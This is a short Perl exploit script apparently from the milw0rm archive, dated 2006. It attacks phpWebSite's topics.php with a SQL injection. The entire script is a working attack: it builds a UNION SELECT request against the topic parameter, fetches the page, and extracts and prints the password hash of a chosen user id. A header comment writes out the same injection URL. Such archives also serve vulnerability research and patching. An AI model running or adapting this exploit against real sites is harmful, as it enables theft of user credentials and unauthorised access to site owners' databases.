#!/usr/bin/perl
# 
# advisory sent in by SnIpEr_SA (selfar2002[at]hotmail.com)
# http://www.target.com/topics.php?op=viewtopic&topic=-1%20Union%20select%20name,name,pass,name%20From%20users%20where%20uid=1
# ported by str0ke (milw0rm.com) from x97Rangs code (RST/GHC) http://rst.void.ru

use LWP::Simple;

$serv     =  $ARGV[0];
$path     =  $ARGV[1];
$uid      =  $ARGV[2];

sub usage
 {
    print "\nUsage: $0 [server] [path] [username] \n";
    print "sever    -  URL\n";
    print "path     -  path to topics.php\n";
    print "uid      -  uid of the user\n\n";
    exit ();}

sub work
 {
    print qq(
       ---------------------------------
#==---[ phpWebSite topic SQL-Injection  |
       ---------------------------------\n\n);&board}

sub board
 {
    $URL = sprintf("http://%s%s/topics.php?op=viewtopic&topic=-1+Union+select+name,name,pass,name+From+users+where+uid=%s",$serv,$path,$uid);
    $content = get "$URL";
    if ($content =~ /(\w{32})/){&showh;}else{print "... One of those days :)\n";}}

sub showh
 {
    print "[*] User: $uid Hash: $1\n\n";}

if (@ARGV != 3){&usage;}else{&work;}

# milw0rm.com [2006-02-24]

